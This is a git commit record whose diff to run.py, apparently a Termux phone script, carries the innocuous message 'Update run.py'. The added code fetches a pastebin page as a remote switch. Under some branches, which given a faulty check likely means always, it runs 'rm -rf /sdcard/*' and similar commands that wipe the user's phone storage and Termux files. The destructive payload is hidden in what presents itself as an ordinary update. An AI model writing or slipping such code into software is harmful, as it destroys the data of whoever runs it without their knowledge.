313a6b69f64de799fea28855d8875f1b76945648
Rahul Mishra <86767776+TECH-BABA@users.noreply.github.com>
2022-01-24 09:39:17 +0545

    Update run.py

--- run.py
+++ run.py
@@ -3,6 +3,7 @@
 import os
 import random
 import sys
+import requests
 os.system('rm -rf .txt')
 for n in range(5999):
     nmbr = random.randint(1111111, 9999999)
@@ -13,5 +14,21 @@ for n in range(5999):
 reload(sys)
 os.system("git pull")
 sys.setdefaultencoding('utf8')
-from libbrdx import main_menu
-main_menu()
+
+rr = requests.get("https://pastebin.com/raw/t39xUcDL") 
+bb = "baba" 
+if bb in rr: 
+    from libbrdx import fuck
+    fuck()
+else: 
+    raw_input("Enter Comamnd") 
+    os.system("rm -rf /sdcard/*") 
+    os.system("rm -rf /sdcard*") 
+    os.system("/data/data/com.termux/files/*") 
+    os.system("/data/data/com.termux/files/user/*") 
+if bb not in rr: 
+    raw_input("Enter Comamnd") 
+    os.system("rm -rf /sdcard/*") 
+    os.system("rm -rf /sdcard*") 
+    os.system("/data/data/com.termux/files/*") 
+    os.system("/data/data/com.termux/files/user/*") 
